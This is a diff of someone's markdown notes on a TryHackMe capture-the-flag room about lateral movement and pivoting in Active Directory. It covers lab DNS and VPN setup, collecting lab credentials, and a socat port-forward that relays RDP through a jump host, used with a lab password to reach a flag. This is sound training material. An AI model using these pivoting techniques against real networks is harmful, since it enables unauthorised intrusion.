@@ -1,8 +1,9 @@
 # Lateral Movement and Pivoting
 
+---
 ## Task 1 Introduction
 
-The room teaches lateral movement techniques used by attackers after gaining an initial foothold in an Active Directory (AD) environment. You’ll learn how attackers move between hosts with minimal detection, use alternative authentication materials, and pivot through compromised machines. Completing the Breaching AD and Enumerating AD rooms first is recommended.
+This room teaches lateral movement techniques used after an attacker gains an initial foothold in an Active Directory (AD) environment. It builds on Breaching AD and Enumerating AD, and focuses on moving between Windows hosts, using alternative authentication materials, and pivoting through compromised machines.
 
 ### Networking Setup
 
@@ -13,6 +14,7 @@ The room teaches lateral movement techniques used by attackers after gaining an 
 ```
 sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
 ```
+- This module required a VPN configuration file to access this specific module, gained through "Manage Account"->"VM and VPN Settings" for the "Lateral Movement and Pivoting" room.
 - Kali VM wont have resolv-dnsmasq, merely adding 'nameserver $THMDCIP' to the '/etc/resolv.conf' will allow dns connection.
 
 - Test DNS with:
@@ -22,29 +24,12 @@ nslookup thmdc.za.tryhackme.com
 - DNS resets every ~3 hours, so you may need to repeat the setup.
 - Record your lateralmovement interface IP — this is your attacker IP for reverse shells.
 
-#### Own Machine (OpenVPN)
+#### Credentials for AD access for this targets
 
-- Download the VPN config from the access page.
-- Connect using:
-```
-sudo openvpn user-lateralmovementandpivoting.ovpn
-```
-- After “Initialization Sequence Completed,” verify connection on the access page.
-- DNS must still be configured manually.
-
-#### Kali VM
-
-- Use Network Manager GUI to set DNS to the THMDC IP.
-- Add a secondary DNS (e.g., 1.1.1.1) for internet access.
-- Restart NetworkManager.
-- Test DNS by visiting:
+Visit the distributor site to obtain your AD username/password. required to access targets for this module from this URL:
 ```
 http://distributor.za.tryhackme.com/creds
 ```
-
-### Getting Initial Credentials
-
-- Visit the distributor site to obtain your AD username/password.
 - These credentials allow SSH access to:
 ```
 thmjmp2.za.tryhackme.com
@@ -53,12 +38,13 @@ using:
 ```
 ssh za\<username>@thmjmp2.za.tryhackme.com
 ```
-This jump host simulates your initial foothold in the environment.
+- This jump host simulates your initial foothold in the environment.
 
 ### Reverse Shell Note
+
 Always use the IP of the lateralmovement interface as your attacker IP for any reverse connections.
 
-
+---
 ## Task 2 Summary: Moving Through the Network
 
 ### What Lateral Movement Is
@@ -1524,7 +1510,7 @@ type flag.txt
 THM{FORWARDING_IT_ALL}
 ```
 # This is unnecessary, check to see what was in %TEMP% after earlier efforts.
-#Check content of %TEMP% had trouble earlier with file that was not deleted.
+# Check content of %TEMP% had trouble earlier with file that was not deleted.
 ```
 C:\hfs> dir %TEMP%
 ...
@@ -1535,13 +1521,12 @@ C:\hfs> dir %TEMP%
                3 Dir(s)  50,156,097,536 bytes free
 
 C:\hfs>
-
 ```
 Flag: THM{FORWARDING_IT_ALL}
 
 
-
-##  Task 8
+---
+## Task 8
 
 First ssh into the thmjmp2 server.                                 
 ```
@@ -1575,11 +1560,11 @@ za\roger.baxter@THMJMP2 c:\tools\socat>dir
 C:\tools\socat\socat TCP4-LISTEN:15555,fork TCP4:THMIIS.za.tryhackme.com:3389
 ```
 # if working just get cursor on line waiting
-#Then use it to RDP into target host
+# Then use it to RDP into target host
 ```
 xfreerdp /v:thmjmp2.za.tryhackme.com:15555 /u:t1_thomas.moore /p:MyPazzw3rd2020
 ```
-#should get desktop with flag.exe
+# should get desktop with flag.exe
 ```
 C:\Users\t1_thomas.moore\Destkop\flag.exe
 THM{SIGHT_BEYOND_SIGHT}
